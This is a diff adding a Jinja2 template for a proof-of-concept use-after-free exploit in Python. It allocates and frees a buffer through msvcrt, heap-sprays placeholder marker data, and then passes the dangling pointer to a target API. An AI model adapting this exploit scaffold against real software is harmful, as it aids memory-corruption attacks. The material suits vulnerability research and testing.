@@ -1,0 +1,59 @@
+{% extends "poc/base.py.j2" %}
+
+{% block description %}Use-after-free vulnerability{% endblock %}
+
+{% block config %}
+ALLOC_SIZE = {{ alloc_size | default(256) }}
+SPRAY_COUNT = {{ spray_count | default(100) }}
+{% endblock %}
+
+{% block payload %}
+# UAF requires heap manipulation
+payload = b''
+{% endblock %}
+
+{% block exploit_doc %}Execute use-after-free exploit{% endblock %}
+
+{% block exploit_body %}
+        print(f"[*] Target uses freed memory at: {{ sink_api }}")
+
+        msvcrt = ctypes.CDLL("msvcrt")
+        malloc = msvcrt.malloc
+        malloc.restype = ctypes.c_void_p
+        malloc.argtypes = [ctypes.c_size_t]
+        free = msvcrt.free
+        free.argtypes = [ctypes.c_void_p]
+
+        # Step 1: Allocate
+        print(f"[*] Step 1: Allocating {ALLOC_SIZE} bytes...")
+        ptr = malloc(ALLOC_SIZE)
+        print(f"[+] Allocated at: 0x{ptr:x}")
+
+        # Fill with marker
+        ctypes.memset(ptr, 0x41, ALLOC_SIZE)
+
+        # Step 2: Free
+        print("[*] Step 2: Freeing buffer...")
+        free(ptr)
+        print("[+] Buffer freed (dangling pointer created)")
+
+        # Step 3: Heap spray
+        print(f"[*] Step 3: Heap spray ({SPRAY_COUNT} allocations)...")
+        spray_ptrs = []
+        controlled_data = b'B' * 8 + struct.pack('<Q', 0x4141414141414141) * 30
+        for i in range(SPRAY_COUNT):
+            new_ptr = malloc(ALLOC_SIZE)
+            if new_ptr:
+                ctypes.memmove(new_ptr, controlled_data, min(len(controlled_data), ALLOC_SIZE))
+                spray_ptrs.append(new_ptr)
+        print(f"[+] Sprayed {len(spray_ptrs)} buffers")
+
+        # Step 4: UAF trigger
+        print("[!] Step 4: Using freed pointer (UAF trigger)...")
+        try:
+            func(ptr)
+        except Exception as e:
+            print(f"[*] Exception during UAF: {type(e).__name__}: {e}")
+
+        print("[+] UAF sequence completed")
+{% endblock %}
